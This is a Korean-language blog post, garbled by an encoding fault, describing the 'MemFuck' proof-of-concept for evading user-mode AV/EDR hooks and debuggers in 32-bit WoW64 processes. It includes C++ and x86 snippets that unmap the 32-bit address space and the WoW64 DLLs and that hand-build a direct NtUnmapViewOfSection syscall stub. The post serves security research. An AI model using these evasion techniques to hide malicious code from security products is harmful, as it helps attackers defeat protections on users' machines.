ë³´ì•ˆ ì œí’ˆê³¼ íˆ´ì—ì„œ ì‚¬ìš©ëœë‹¤. user-mode hookì€ êµ¬í˜„í•˜ê¸° ì‰½ê³ , ì•ˆì •ì ì´ê³ , ê°„ë‹¨í•˜ë©° ì„±ëŠ¥ ì˜¤ë²„í—¤ë“œê°€ ì ë‹¤.</p><p>ëŒ€ë¶€ë¶„ user-land hookì€ inline hookì´ë©° control flowë¥¼ custom handlerë¡œ ë¦¬ë‹¤ì´ë ‰íŠ¸ ì‹œí‚¤ê¸° ìœ„í•œ ëŒ€ìƒ í•¨ìˆ˜ rewriteë¥¼ í¬í•¨í•œë‹¤. í•¸ë“¤ëŸ¬ì˜ ë‚´ë¶€ì—ì„œ íŒŒë¼ë¯¸í„°ë“¤ì€ ë³´ì¡´ë˜ê³  ìš”ì²­ëœ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê±°ë‚˜ ë¶„ì„í• ì§€ ê²°ì •í•  ìˆ˜ ìˆë‹¤. ì´ê²ƒë“¤ì€ ì˜ ë¬¸ì„œí™”ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ì´ëŸ¬í•œ ê°œë…ì— ìµìˆ™í•  ê²ƒì´ë¼ê³  ê°€ì •í•  ê²ƒì´ë‹¤.</p><h2 id="32-bit-Hooks"><a href="#32-bit-Hooks" class="headerlink" title="32-bit Hooks"></a>32-bit Hooks</h2><p><img src="/2021/01/10/idioth/memfuck/image0.png"></p><p>32ë¹„íŠ¸ user-land hookì´ í¬í•¨ëœë‹¤. 32ë¹„íŠ¸ ìœ ì € ëª¨ë“œ ë³´ì•ˆ ì œí’ˆì€ ëŒ€ë¶€ë¶„ ê°€ëŠ¥í•œ ê¹Šì€ ìœ„ì¹˜ì—ì„œ hook í•˜ë©° ntdllì— ëŒ€ë¶€ë¶„ì˜ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ í•¨ìˆ˜ë“¤(NtQueueApcThread ë“±)ì´ ì¡´ì¬í•œë‹¤. í•´ê²° ë°©ë²•ì€ system callì„ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ê¸°ëŠ¥ì„ ì§ì ‘ì ìœ¼ë¡œ í˜¸ì¶œí•˜ëŠ” ê²ƒì´ë‹¤. Ring3 í›„í‚¹ìœ¼ë¡œ ëª¨ë“  ë³´ì•ˆ ì œí’ˆì„ ìš°íšŒí•  ìˆ˜ ìˆë‹¤.</p><p>í•„ìëŠ” 5ë…„ ë™ì•ˆ 32ë¹„íŠ¸ ìœˆë„ìš°ë¥¼ ì ‘í•œ ê²½ìš°ê°€ í•˜ë‚˜ë„ ì—†ìœ¼ë¯€ë¡œ ì¼ë°˜ì ì¸ ê²½ìš°ì¸ WoW64ì—ì„œ ë™ì‘í•˜ëŠ” 32ë¹„íŠ¸ ì‘ìš© í”„ë¡œê·¸ë¨ì— ëŒ€í•´ ì‚´í´ë³¼ ê²ƒì´ë‹¤.</p><h2 id="WoW64ì—ì„œì˜-32ë¹„íŠ¸-í›„í‚¹"><a href="#WoW64ì—ì„œì˜-32ë¹„íŠ¸-í›„í‚¹" class="headerlink" title="WoW64ì—ì„œì˜ 32ë¹„íŠ¸ í›„í‚¹"></a>WoW64ì—ì„œì˜ 32ë¹„íŠ¸ í›„í‚¹</h2><p><img src="/2021/01/10/idioth/memfuck/image1.png"></p><p>ê°€ì¥ í”í•œ ì•…ì„±ì½”ë“œì˜ ì¸ìŠ¤í„´ìŠ¤ëŠ” Wow64ì—ì„œ ë™ì‘í•˜ëŠ” 32ë¹„íŠ¸ í”„ë¡œê·¸ë¨ì´ë‹¤(64ë¹„íŠ¸ ë¨¸ì‹ ì—ì„œ ë™ì‘). NGAVì™€ EDRì€ ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œì˜ hook êµ¬í˜„ì´ ë¯¸í¡í•˜ë‹¤. ëŒ€ë¶€ë¶„ ë³´ì•ˆ ì œí’ˆì€ x86 ìœ ì € ëª¨ë“œ ì˜ì—­ì—ì„œë§Œ hookì„ í•œë‹¤. user-mode hookì„ í™œìš©í•˜ëŠ” ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ëŠ” WoW64 layerì— hookì„ ìœ„ì¹˜í•˜ëŠ” ê²ƒì´ ì¢‹ì§€ë§Œ ëª¨ë“  ì—…ì²´ê°€ ê·¸ê²ƒì„ êµ¬í˜„í•˜ì§€ëŠ” ì•ŠëŠ”ë‹¤. <a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">Sophos ìš°íšŒì— ê´€í•œ MDSecì˜ ê²Œì‹œê¸€</a>ì„ ë³´ì•„ë¼.</p><p>ë§ì€ ë³´ì•ˆ ì œí’ˆë“¤ì´ 32ë¹„íŠ¸ í”„ë¡œì„¸ìŠ¤ì—ì„œ WoW64 ì‹¤í–‰ì„ ëª¨ë‹ˆí„°ë§í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì‚¬ì‹¤ì€ ì˜¤ë«ë™ì•ˆ ì•Œë ¤ì ¸ ìˆì—ˆê³  <a href="https://blog.malwarebytes.com/threat-analysis/2018/01/a-coin-miner-with-a-heavens-gate/">ì•…ì„±ì½”ë“œ ì œì‘ì</a>ì™€ <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">red-team</a>ì— ì˜í•´ ê³µê²©ë‹¹í–ˆë‹¤. í•„ìê°€ ë¶„ì„í•œ ì•…ì„±ì½”ë“œ ì¤‘ì— ì–¼ë§ˆë‚˜ ë§ì€ ê²ƒë“¤ì´ ì´ë¥¼ ì•…ìš©í•œ <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolfâ€™s wow64ext</a>ë¥¼ í¬í•¨í•˜ëŠ”ì§€ ë§í•  ìˆ˜ ì—†ë‹¤.</p><h2 id="ìš”ì•½-ê¸°ì¡´-ê¸°ìˆ "><a href="#ìš”ì•½-ê¸°ì¡´-ê¸°ìˆ " class="headerlink" title="ìš”ì•½ : ê¸°ì¡´ ê¸°ìˆ "></a>ìš”ì•½ : ê¸°ì¡´ ê¸°ìˆ </h2><ul><li>ë‹¨ìˆœíˆ í•¨ìˆ˜ì˜ Ntdll ë²„ì „ì„ í˜¸ì¶œí•˜ëŠ” ê²ƒ</li><li><a href="https://web.archive.org/web/20190407064851/https://blog.ensilo.com/globeimposter-ransomware-technical">í•¨ìˆ˜ì˜ Wow64 ë²„ì „ì„ í˜¸ì¶œí•˜ëŠ” ê²ƒ</a></li><li><a href="https://cdn2.hubspot.net/hubfs/487909/ENSILO%20WHITEPAPER%20ENTER%20THE%20DARK%20GATE.pdf">ì§ì ‘ Syscall í˜¸ì¶œ</a></li><li>ì›ë³¸ thunk ì¶”ì  (<a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">FireWalker</a>)</li><li><a href="https://blog.malwarebytes.com/threat-analysis/2018/03/hancitor-fileless-attack-with-a-copy-trick/">ë³´ì¡° DLL ë§¤í•‘</a></li><li>Code splicing (byte stealing)</li></ul><p>ëª¨ë‘ ì˜ ì‘ë™í•˜ê³  ì¢‹ì§€ë§Œ 64ë¹„íŠ¸ ë²„ì „ì˜ ntdllì— ìœ„ì¹˜í•œ hookì—ì„œ ë™ì‘í•˜ì§€ ì•Šì„ ìˆ˜ ìˆë‹¤. í•„ìì˜ ê´€ì°°ì—ì„œ ì´ëŸ¬í•œ ë ˆë²¨ì˜ hookì€ ì–´ë–¤ public ì½”ë“œë¡œë„ ë³¸ ì ì´ ì—†ê³  ì–´ë–¤ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ë„ êµ¬í˜„í•˜ì§€ ì•Šì•˜ë‹¤. ëª‡ ê°€ì§€ ì¡´ì¬í•  ê²ƒì´ë¼ê³  í™•ì‹ í•˜ì§€ë§Œ ë³´ì§€ ëª»í–ˆë‹¤.</p><h2 id="MemFuckì—-ë“¤ì–´ê°€ë©°"><a href="#MemFuckì—-ë“¤ì–´ê°€ë©°" class="headerlink" title="MemFuckì— ë“¤ì–´ê°€ë©°"></a>MemFuckì— ë“¤ì–´ê°€ë©°</h2><p>Memfuckì€ ì˜¤ì§ PoCì´ë©° production codeì™€ ìœ ì‚¬í•˜ì§€ ì•Šë‹¤. ì¦‰ í•„ìëŠ” ìœ ì € ì˜ì—­ì—ì„œ ê°€ëŠ¥í•œ ê°•ë ¥í•œ anti-analysis ê¸°ìˆ ì´ë¼ê³  ìƒê°í•œë‹¤.</p><p>MemFuckì€ ë‹¤ë¥¸ anti-analysis ë°©ë²•ìœ¼ë¡œ ì‹¤í—˜ì„ ì‹œì‘í–ˆë‹¤. ë³¸ì§ˆì ìœ¼ë¡œ ê°€ëŠ¥í•œ í•œ ë¹„ì–´ìˆëŠ” í”„ë¡œì„¸ìŠ¤ë¥¼ ìƒì„±í•˜ê¸¸ ì›í–ˆìœ¼ë¯€ë¡œ DLLì´ë‚˜ ì‰˜ ì½”ë“œì˜ ìˆ˜ì • ì—†ì´ ë³´ì•ˆ ì œí’ˆì„ attach í•  ìˆ˜ ì—†ì—ˆë‹¤. í•„ìëŠ” 2008ë…„ì— ì´ <a href="https://gynvael.coldwind.pl/?id=93">ê²Œì‹œê¸€</a>ì„ ë°œê²¬í–ˆëŠ”ë° ë§¤ìš° í¥ë¯¸ë¡œì› ë‹¤. ë¬¼ë¡  32ë¹„íŠ¸ ìœˆë„ìš° XPì—ì„œ ë§ì€ ë³€í™”ê°€ ìˆì—ˆìœ¼ë¯€ë¡œ ë§ì€ ì½”ë“œê°€ í˜¸í™˜ë˜ì§€ ì•Šì§€ë§Œ ëŒ€ë¶€ë¶„ì˜ ê°œë…ì´ ì¡´ì¬í•œë‹¤.</p><p><img src="/2021/01/10/idioth/memfuck/image2.png"></p><p>ë¬´ì—‡ì´ ntdllì„ í•„ìš”ë¡œ í•˜ëŠ”ê°€? ëª¨ë“  ê²°ê³¼ëŠ” íŠ¹ì •í•œ DLLì— ì˜ì¡´í•˜ë¯€ë¡œ ì´ë¥¼ ë§ì³ë²„ë¦¬ë©´ ì–´ë– í•œ ì¼ì´ ì¼ì–´ë‚ ê¹Œ</p><h2 id="Unmap-Everything"><a href="#Unmap-Everything" class="headerlink" title="Unmap Everything"></a>Unmap Everything</h2><p>MemFuckì€ 32ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì—ì„œ ê°€ëŠ¥í•œ ëª¨ë“  ê²ƒì„ unmap í•˜ëŠ” ê²ƒì— ì˜í•´ ì‹œì‘ëœë‹¤. ë¬¼ë¡  PEB/PEB64, TEB/TEB64ì™€ <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data">KUSER_SHARED_DATA</a> (ì‘ë…„ì— ë§ˆì¹¨ë‚´ ë¬¸ì„œí™”ë˜ì—ˆë‹¤) ê°™ì´ í•´ì œê°€ ë¶ˆê°€ëŠ¥í•œ ê²ƒë“¤ë„ ìˆë‹¤. ì´ì— ëŒ€í•´ ëª‡ ê°€ì§€ ë°©ë²•ì´ ìˆì§€ë§Œ ê°€ëŠ¥í•œ ê·€ì°®ì§€ ì•Šì€ ë°©ë²•ì„ ì„ íƒí•˜ê³  ì‹¶ì—ˆë‹¤. ìš°ë¦¬ëŠ” ëª¨ë“  ê²ƒì— NtUnmapViewOfSectionì„ í˜¸ì¶œí•˜ëŠ” x86 ì‰˜ ì½”ë“œë¥¼ í• ë‹¹í•  ìˆ˜ ìˆì§€ë§Œ ê·¸ë ‡ê²Œ ntdllì„ unmap í•˜ë©´ ë¬´ìŠ¨ ì¼ì´ ì¼ì–´ë‚ ê¹Œ? Ntdllì€ ìê¸° ìì‹ ì„ unmap í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ ì´ ë°©ë²•ì€ ë™ì‘í•˜ì§€ ì•ŠëŠ”ë‹¤. ë‹¤ìŒ ë‹¨ê³„ì—ì„œ í•„ìëŠ” code segment switching(Heavenâ€™s Gate)ì„ í†µí•´ ì§ì ‘ syscall í˜¸ì¶œì„ ì‹œí—˜í•´ë³´ì•˜ë‹¤. 32ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì—ì„œ 64ë¹„íŠ¸ syscall ì‹¤í–‰ì€ ì¶©ë¶„íˆ ê°€ëŠ¥í•˜ì§€ë§Œ ì´ ë°©ë²•ì€ ëª‡ ê°€ì§€ ì´ìœ ë¡œ ì´ìƒì ì´ì§€ ì•Šì•˜ë‹¤.</p><ul><li>32ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì—ì„œ ì½”ë“œê°€ ë§¤í•‘ë˜ê³  ì‹¤í–‰ë˜ë¯€ë¡œ ë¶„ì„í•˜ê¸° ì‰¬ìš¸ ê²ƒì´ë‹¤.</li><li>64ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì€ ì—¬ì „íˆ ì†ìƒë˜ì–´ ìˆì§€ ì•Šë‹¤.</li><li>ì´ ê¸°ìˆ ì€ user-mode hookì„ ìš°íšŒí•˜ê¸° íš¨ê³¼ì ì´ì§€ë§Œ ì´ë¯¸ ë¬¸ì„œí™”ë˜ì–´ ìˆë‹¤.</li></ul><p>ì „ë¶€ëŠ” ì•„ë‹ˆì§€ë§Œ ëŒ€ë¶€ë¶„ Ring3 hookì„ í™œìš©í•˜ëŠ” AV/EDR ì—…ì²´ë“¤ì€ í•˜ë‚˜ì˜ ì¼ë°˜ì ì¸ ê°€ì •ì„ í•œë‹¤ê³  ìƒê°í•œë‹¤. WoW64 ìœ„ì—ì„œ ì‹¤í–‰í•˜ëŠ” 32ë¹„íŠ¸ í”„ë¡œì„¸ìŠ¤ëŠ” 4GBë¡œ ì œí•œëœ ì£¼ì†Œ ì•„ë˜ì—ì„œ ì‚¬ìš©ì ì •ì˜ëœ ì½”ë“œë¥¼ ê°€ì§„ë‹¤. ë”°ë¼ì„œ ë§¤í•‘ë˜ì§€ ì•Šì€ ì½”ë“œë¥¼ ë” ë§ì´ ë°°ì¹˜í•˜ê³  ê¸°ëŠ¥ì„ ê³„ì†í•  ìˆ˜ ìˆëŠ” ì´ ì œí•œ ì´ìƒì˜ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•´ë³´ì. Alex Ionescuì— ë”°ë¥´ë©´ <a href="https://twitter.com/aionescu/status/677599528409677824?lang=en">ì´ê²ƒì€ ê°€ëŠ¥í•˜ì§€ ì•Šë‹¤</a>. ê·¸ëŸ¬ë‚˜ Petr Benesì™€ ì–˜ê¸°í•œ í›„ ê·¸ëŠ” ìµœê·¼ ë²„ì „ì˜ ìœˆë„ìš°10ì—ì„œ ì´ëŸ¬í•œ ì œí•œì´ í•´ì œë˜ì—ˆë‹¤ê³  ìƒê°í•œë‹¤. ìœˆë„ìš°10 Build 19041.508ì—ì„œ í…ŒìŠ¤íŠ¸í–ˆë‹¤.</p><p>64ë¹„íŠ¸ ë²„ì „ì˜ <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a> í˜¸ì¶œí•˜ê¸° ìœ„í•´ <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolfâ€™s wow64ext</a>ë¥¼ ì‚¬ìš©í–ˆë‹¤. í•„ìê°€ ì²˜ìŒ í˜¸ì¶œì„ ì‹œë„í–ˆì„ ë•Œ í˜¼ë€ìŠ¤ëŸ¬ìš´ ê²°ê³¼ë¥¼ ë´¤ë‹¤. BaseAddress ìš”ì²­ì´ Nullì´ë©´ ìš´ì˜ì²´ì œê°€ ë©”ëª¨ë¦¬ í• ë‹¹í•  ìœ„ì¹˜ë¥¼ ê²°ì •í•œë‹¤. ë¬¼ë¡  ìœˆë„ìš°ëŠ” ìš°ë¦¬ê°€ ìˆì–´ì„œëŠ” ì•ˆ ë˜ëŠ” ê³³ì— ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ëŠ” ê²ƒì„ ì›í•˜ì§€ ì•Šìœ¼ë©° 64ë¹„íŠ¸ í˜¸ì¶œì€ 32ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì— ì˜ í• ë‹¹ëœ ë©”ëª¨ë¦¬ë¥¼ ë°˜í™˜í•œë‹¤. ZeroBit í”Œë˜ê·¸ë¥¼ ë§ì¹˜ëŠ” ê²ƒì€ ì–´ë–¨ê¹Œ? í•„ìëŠ” ZeroBit í”Œë˜ê·¸ë¥¼ ì¡°ì‘í•´ì„œ ê°€ëŠ¥í•œ ë†’ì€ ì£¼ì†Œì— request í•˜ëŠ” ë°©ë²•ì„ ì„¤ëª…í•˜ëŠ” <a href="https://stackoverflow.com/questions/50429365/what-is-the-most-reliable-portable-way-to-allocate-memory-at-low-addresses-on">stackoverflow ê²Œì‹œê¸€</a>ì„ ì°¾ì•˜ë‹¤. ë‹¤ì‹œ í•„ìëŠ” ZeroBit í”Œë˜ê·¸ë¥¼ ì¡°ì‘í•˜ì—¬ 64ë¹„íŠ¸ NtAllocateVirtual requestì— MEM_TOP_DOWN í”Œë˜ê·¸ë¥¼ ì¶”ê°€í•´ë³´ì•˜ë‹¤. ë©”ëª¨ë¦¬ê°€ ì‚´ì§ ë†’ê¸´ í•˜ì§€ë§Œ 32ë¹„íŠ¸ ì£¼ì†Œë¥¼ ë§Œë‚¬ë‹¤. ì´ ì§€ì ì—ì„œ ë§¤ê°œë³€ìˆ˜ë¥¼ ì¡°ì‘í•˜ëŠ” ì•„ì´ë””ì–´ë¥¼ ì–»ì—ˆë‹¤. ìš°ë¦¬ê°€ ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ìš”ì²­í•˜ì! í•„ìëŠ” BaseAddressë¥¼ 64ë¹„íŠ¸ ì£¼ì†Œ(ë§ì€ ë©”ëª¨ë¦¬ì™€ 3ê°œì˜ DLL)ë¡œ ì„¤ì •í–ˆê³  ë†€ëê²Œë„ ê·¸ ì£¼ì†Œì— í• ë‹¹ëë‹¤.</p><p><img src="/2021/01/10/idioth/memfuck/image3.png"></p><p>ë¬¼ë¡  ì—¬ê¸°ì„œ ìš°ë¦¬ê°€ ì²« ë²ˆì§¸ë¡œ í•´ì•¼ í•  ê²ƒì€ ì—¬ê¸°ì— ì‰˜ ì½”ë“œë¥¼ ì¨ì„œ ì–´ë– í•œ í–‰ë™ì´ ì¼ì–´ë‚˜ëŠ”ì§€ ë³´ëŠ” ê²ƒì´ë‹¤. <a href="https://github.com/jackullrich/ShellcodeStdio">ShellcodeStdio</a>ë¥¼ ì‚¬ìš©í•´ì„œ ë¹ ë¥´ê³  ì‰½ê²Œ 64ë¹„íŠ¸ ì‰˜ ì½”ë“œë¥¼ ì‘ì„±í–ˆë‹¤. ì´ ì‰˜ ì½”ë“œëŠ” 64ë¹„íŠ¸ ê³µê°„ì— í• ë‹¹ë˜ê³  ì“°ì´ë©° ê¸°ë³¸ì ìœ¼ë¡œ 32ë¹„íŠ¸ ìœ ì € ëª¨ë“œì˜ ëª¨ë“  ê²ƒì— unmapì„ ì‹œë„í•œë‹¤.</p><p>ì²« ë²ˆì§¸ ì‹œë„ì— ëŒ€í•œ ìˆ˜ë„ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.</p><pre><code class="hljs cpp">DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtUnmapViewOfSection);DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtProtectVirtualMemory);<span class="hljs-keyword">for</span> (DWORD m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">0x80000000</span>; m += <span class="hljs-number">0x1000</span>)    &#123;      PVOID ptrToProtect = (PVOID)m;      ULONG dwBytesToProtect = <span class="hljs-number">1</span>;      ULONG dwOldProt = <span class="hljs-number">0</span>;      NtProtectVirtualMemory((HANDLE)<span class="hljs-number">-1</span>, &amp;ptrToProtect, &amp;dwBytesToProtect, PAGE_READWRITE, &amp;dwOldProt);      NtUnmapViewOfSection((HANDLE)<span class="hljs-number">-1</span>, (PVOID)m);    &#125;</code></pre><p><img src="/2021/01/10/idioth/memfuck/image4.png"></p><p>í”„ë¡œì„¸ìŠ¤ê°€ ì—‰ë§ì´ë‹¤. ê·¸ëŸ¬ë‚˜ ì—¬ì „íˆ ì½”ë“œëŠ” ì‹¤í–‰ë˜ê³  ìˆìœ¼ë©° ì˜ ë™ì‘í•˜ê³  ìˆë‹¤. anti-analysisì„ í•˜ê¸°ì— ìƒë‹¹íˆ ì¢‹ì€ í™˜ê²½ì´ë‹¤. 32ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì˜ ì™„ì „í•œ ì œì–´ë¥¼ ê°–ê³  ìš°ë¦¬ê°€ ì›í•˜ëŠ” ê²ƒì„ í™•ì‹¤íˆ ë¡œë“œí•˜ê³  ì–¸ë¡œë“œ í•  ìˆ˜ ìˆë‹¤. OllyDbgì™€ x64dbg ê°™ì€ ë§ì€ ë””ë²„ê±°ë“¤ì€ ì—¬ê¸°ì„œ í¬ë˜ì‹œê°€ ë‚˜ì„œ ë¶„ì„ì„ ê³„ì†í•˜ê¸° ìœ„í•´ Windbgë¥¼ ì‚¬ìš©í–ˆë‹¤.</p><h2 id="An-Interstring-Intermission"><a href="#An-Interstring-Intermission" class="headerlink" title="An Interstring Intermission"></a>An Interstring Intermission</h2><p>í”„ë¡œì„¸ìŠ¤ì˜ 32ë¹„íŠ¸ ì£¼ì†Œ ì˜ì—­ì„ ì™„ì „íˆ ì§€ì›Œë²„ë¦¬ë©´ì„œ ì½”ë“œëŠ” ì˜ë„ëŒ€ë¡œ ì‹¤í–‰í•˜ê³  ë™ì‘í•˜ë„ë¡ í•˜ëŠ” ëª©í‘œì— ê±°ì˜ ì„±ê³µí–ˆì—ˆë‹¤. ì—¬ê¸°ì—ëŠ” ê³µê²©ì ì¸ ê²°ê³¼ì™€ ë°©ì–´ì ì¸ ê²°ê³¼ê°€ ê°™ì´ ìˆë‹¤. ì•„ë§ˆ ì´ ê¸°ê°„ ë™ì•ˆ ê°€ì¥ í¥ë¯¸ë¡œìš´ ì‚¬ì‹¤ ì¤‘ í•˜ë‚˜ëŠ” <a href="https://docs.microsoft.com/en-us/windows/win32/winprog64/exception-handling-under-wow64">MSDN í˜ì´ì§€</a>ë¥¼ ë°œê²¬í–ˆì„ ë•Œì´ë‹¤.</p><blockquote><p>WOW64ëŠ” x86 ì˜ˆì™¸ì— ëŒ€í•œ ì „ì†¡ìœ¼ë¡œ native x64, ia64 ë˜ëŠ” ARM64 ì˜ˆì™¸ë¥¼ ì‚¬ìš©í•œë‹¤. ë”°ë¼ì„œ WOW64ì—ì„œ ë™ì‘í•˜ëŠ” 32ë¹„íŠ¸ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ í¬ì°©ë˜ì§€ ì•Šì€ ì˜ˆì™¸ëŠ” native 64ë¹„íŠ¸ ì˜ˆì™¸ì²˜ëŸ¼ ë™ì‘í•œë‹¤.</p></blockquote><p>4GB ê²½ê³„ ìœ„ì˜ ì£¼ì†Œì— 64ë¹„íŠ¸ ì‰˜ ì½”ë“œë¥¼ ì“¸ ìˆ˜ ìˆëŠ”ë°, 64ë¹„íŠ¸ ê³µê°„ì— 64ë¹„íŠ¸ ë²¡í„° ì˜ˆì™¸ ì²˜ë¦¬ê¸°(Vectored Exception Handler)ë¥¼ ì„¤ì¹˜í•˜ë©° 32ë¹„íŠ¸ ì˜ˆì™¸ì— ì˜í•´ íŠ¸ë¦¬ê±° ë˜ê³  Control Flowê°€ 64bit VEHì— ì˜í•´ ë¦¬ë‹¤ì´ë ‰ì…˜ ëœë‹¤.</p><p><img src="/2021/01/10/idioth/memfuck/image5.png"></p><p>32ë¹„íŠ¸ ntdllì´ ë¡œë“œë˜ì–´ ì œëŒ€ë¡œ ëìŒì„ í™•ì‹ í–ˆë‹¤. ëª¨ë“  ê²ƒì´ unmap ëœ ì˜ˆì™¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” ê²ƒì€ ì‰½ì§€ë§Œ ì²˜ë¦¬í•  WoW64 ë ˆì´ì–´ë¡œ ì „í™˜í•  ì½”ë“œê°€ ì—†ë‹¤. í•˜ì§€ë§Œ ì´ ì•„ì´ë””ì–´ì—ëŠ” ë§ì€ í¥ë¯¸ë¡œìš´ ì ì¬ë ¥ì´ ìˆë‹¤.</p><h2 id="Ntdll-No-More"><a href="#Ntdll-No-More" class="headerlink" title="Ntdll No More"></a>Ntdll No More</h2><p>ë” ì´ìƒ ì–´ë–¤ ëª©ì ì„ ìœ„í•´ì„œë“  ntdllì— ì˜ì¡´í•˜ì§€ ì•ŠëŠ”ë‹¤ëŠ” ì›ë˜ ê°œë…ìœ¼ë¡œ ëŒì•„ê°€ì„œ WoW64 ê³„ì¸µì— ë‚¨ì€ 3ê°œì˜ dllì„ unmapping í•˜ëŠ” ì¼ì´ ë‚¨ì•˜ë‹¤. WoW64ëŠ” ëŒ€ë¶€ë¶„ ì‹œìŠ¤í…œì—ì„œ ê±°ì˜ ë™ì¼í•˜ë‹¤.(WoW64.dll, wow64win.dll, ntdll.dll)</p><p><img src="/2021/01/10/idioth/memfuck/image6.png"></p><p>32ë¹„íŠ¸ ì½”ë“œë¡œ ëŒì•„ê°€ì§€ ì•Šì„ ê²ƒì´ë¼ê³  ìƒê°í•˜ë‹ˆ ë” ì´ìƒ í•„ìš”í•˜ì§€ ì•Šì€ ì´ dllë“¤ì„ unmap í•˜ì.</p><pre><code class="hljs cpp">DWORD64 addrWoW64 = <span class="hljs-number">0</span>;  DWORD64 addrWoW64Win = <span class="hljs-number">0</span>;  DWORD64 addrNtdll = <span class="hljs-number">0</span>;  PPEB peb64 = getPEB();  LIST_ENTRY* first = peb64-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;  LIST_ENTRY* ptr = first;  <span class="hljs-keyword">int</span> cntr = <span class="hljs-number">0</span>;  <span class="hljs-keyword">do</span> &#123;    LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);    ptr = ptr-&gt;Flink;    <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">1</span>) &#123;      addrNtdll = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">2</span>) &#123;      addrWoW64 = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">3</span>) &#123;      addrWoW64Win = (DWORD64)dte-&gt;DllBase;    &#125;    cntr++;  &#125; <span class="hljs-keyword">while</span> (ptr != first);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64Win);</code></pre><p><img src="/2021/01/10/idioth/memfuck/image7.png"></p><p>32ë¹„íŠ¸ ì£¼ì†Œ ê³µê°„ì— ë” ì´ìƒ hookì€ ì¡´ì¬í•˜ì§€ ì•Šìœ¼ë©° WoW64 dll(Wow64SystemServiceEx ë“±)ì— ìˆëŠ” ê²ƒë„ ë‹¤ ì‚¬ë¼ì¡Œë‹¤. ë‚¨ì€ ì¼ì€ ntdllì„ unmap í•˜ëŠ” ê²ƒì´ë‹¤. ë‹¤ì‹œ í•œë²ˆ ë¶€ëª¨ ëª¨ë“ˆì—ì„œ NtUnmapViewOfSectionì„ í˜¸ì¶œí•˜ëŠ” ë¬¸ì œê°€ ìƒê²¼ë‹¤. ì§ì ‘ system callì„ í•˜ì.</p><p>64ë¹„íŠ¸ MSVC ì»´íŒŒì¼ëŸ¬ê°€ inline assemblyë¥¼ ì œê³µí•˜ì§€ ì•Šìœ¼ë¯€ë¡œ function ordering, ë‚´ë¶€ ì½”ë“œ ë°°ì¹˜ ì œí•œìœ¼ë¡œ ì¸í•´ system call stubì— ìƒˆë¡œìš´ ë©”ëª¨ë¦¬ ì˜ì—­ì„ í• ë‹¹í•˜ê¸°ë¡œ ê²°ì •í–ˆë‹¤. ìœˆë„ìš° 10 64ë¹„íŠ¸ì˜ Syscall stubì€ ì•„ë˜ì™€ ê°™ë‹¤.</p><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rcx</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, xxh<span class="hljs-keyword">syscall</span><span class="hljs-keyword">retn</span></code></pre><p>NtdllVirtualMemoryë¥¼ í˜¸ì¶œí•˜ê³  DWORD by DWORDë¡œ ì½”ë“œë¥¼ ì‘ì„±í•´ë¼. ê·¸ë¦¬ê³  typedef prototypeì„ í• ë‹¹í•˜ë©´ Nt* í•¨ìˆ˜ë¥¼ ì‰½ê²Œ í˜¸ì¶œí•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">DWORD dwCode1 = <span class="hljs-number">0xb8d18b4c</span>;  DWORD dwCode2 = <span class="hljs-number">0x0000002a</span>; <span class="hljs-comment">// syscall code for NtUnmapViewOfSection</span>  DWORD dwCode3 = <span class="hljs-number">0x90c3050f</span>;  <span class="hljs-comment">// mov r10, rcx ; 0x4c 0x8b 0xd1</span>  <span class="hljs-comment">// mov eax, xxh ; 0xb8 xx 00 00 00</span>  <span class="hljs-comment">// syscall ; 0x0f 0x05</span>  <span class="hljs-comment">// retn ; 0xc3</span>  *(DWORD*)syscallbase = dwCode1;  *((DWORD*)syscallbase + <span class="hljs-number">1</span>) = dwCode2;  *((DWORD*)syscallbase + <span class="hljs-number">2</span>) = dwCode3;  